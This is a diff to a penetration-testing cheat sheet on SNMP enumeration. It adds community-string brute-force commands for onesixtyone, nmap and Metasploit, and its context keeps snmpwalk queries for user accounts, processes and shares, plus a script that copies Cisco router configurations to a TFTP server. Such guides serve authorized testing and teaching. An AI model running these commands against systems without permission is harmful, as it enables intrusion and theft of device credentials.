@@ -30,9 +30,9 @@ Snmp configuration file is located by default in:
 
 and it includes the passwords for the community and private string
 
-
-
 ### Brute force community string
+
+#### onesixtyone
 
 ```
 ./onesixtyone -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.92 
@@ -41,7 +41,17 @@ Scanning 1 hosts, 122 communities
 10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
 ```
 
+#### NMAP
 
+```
+nmap -p 161 --script snmp-brute <target>
+```
+
+#### Metasploit
+
+```
+msfconsole -qx "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS file:scope.txt; run"
+```
 
 ### **Metasploit - Enumerate users**
 
@@ -80,72 +90,70 @@ Debian-snmp@intense:/$ id
 uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
 ```
 
-### SNMP IPv6 Enumeration&#x20;
+### SNMP IPv6 Enumeration
 
-[Enyx](broken-reference) is an enumerator tool about grabbing the possible IPV6 of a machine through the snmp protocol.
+[Enyx](broken-reference/) is an enumerator tool about grabbing the possible IPV6 of a machine through the snmp protocol.
 
+### SNMPv3
 
+Identify SNMPv3 servers with nmap:
 
-### SNMPv3&#x20;
+`nmap -sV -p 161 --script=snmp-info TARGET-SUBNET`
 
-Identify SNMPv3 servers with nmap:&#x20;
-
-`nmap -sV -p 161 --script=snmp-info TARGET-SUBNET`&#x20;
-
-Rory McCune’s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:&#x20;
+Rory McCune’s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:
 
 ```
 apt-get install snmp snmp-mibs-downloader 
 wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
 ```
 
-### &#x20;SNMP  Enumeration - Windows tool
+### SNMP Enumeration - Windows tool
 
-Getif is a free multi-functional Windows GUI based Network Tool written by Philippe Simonet.  It is amongst other things, an excellent SNMP tool that allows you to collect and graph information from SNMP devices.&#x20;
+Getif is a free multi-functional Windows GUI based Network Tool written by Philippe Simonet. It is amongst other things, an excellent SNMP tool that allows you to collect and graph information from SNMP devices.
 
-Download:&#x20;
+Download:
 
-[http://www.wtcs.org/snmp4tpc/getif.htm](http://www.wtcs.org/snmp4tpc/getif.htm)&#x20;
+[http://www.wtcs.org/snmp4tpc/getif.htm](http://www.wtcs.org/snmp4tpc/getif.htm)
 
-Install and set compatability as Windows XP SP2&#x20;
+Install and set compatability as Windows XP SP2
 
-Press STRAT once you put the IP and public commuinty&#x20;
+Press STRAT once you put the IP and public commuinty
 
-Download the  SNMP4tPC Getif MIB collection as well.
+Download the SNMP4tPC Getif MIB collection as well.
 
 ![](../.gitbook/assets/GetImage.gif)
 
-For each tab press 'start' to get the information &#x20;
+For each tab press 'start' to get the information
 
-`Error: If you getting 'DllRegisterServer (msflxgrd) failed' error` – run the software as administrator &#x20;
+`Error: If you getting 'DllRegisterServer (msflxgrd) failed' error` – run the software as administrator
 
 ### **Common Mibs**
 
-**interfaces** \
-`snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.2.2`&#x20;
+**interfaces**\
+`snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.2.2`
 
-**Windows User Accounts** \
-`snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25`&#x20;
+**Windows User Accounts**\
+`snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25`
 
-**Windows Running Programs** \
-`snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2`&#x20;
+**Windows Running Programs**\
+`snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2`
 
-**Windows Hostname** \
-`snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5`&#x20;
+**Windows Hostname**\
+`snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5`
 
-**Windows Share Information** \
-`snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1`&#x20;
+**Windows Share Information**\
+`snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1`
 
-**Windows Share Information** \
-`snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27`&#x20;
+**Windows Share Information**\
+`snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27`
 
-**Windows TCP Ports** \
-`snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3`&#x20;
+**Windows TCP Ports**\
+`snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3`
 
-**Software Name** \
-`snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2`&#x20;
+**Software Name**\
+`snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2`
 
-**SysLocation** \
+**SysLocation**\
 `snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.1.6`
 
 ### Solaris MIBS
@@ -156,9 +164,9 @@ Enumerate users on solaris:
 
 ### Download Cisco Conf
 
-Copies configuration files from Cisco devices running SNMP.&#x20;
+Copies configuration files from Cisco devices running SNMP.
 
-**Usage**:&#x20;
+**Usage**:
 
 ```
 root@kali:~# copy-router-config.pl 
@@ -170,6 +178,6 @@ Usage : ./copy-copy-config.pl <router-ip> <tftp-serverip> <community>
 Make sure a TFTP server is set up, preferably running from /tmp ! 
 ```
 
-**Example:**&#x20;
+**Example:**
 
 `root@kali:~# copy-router-config.pl 192.168.1.1 192.168.1.15 private`
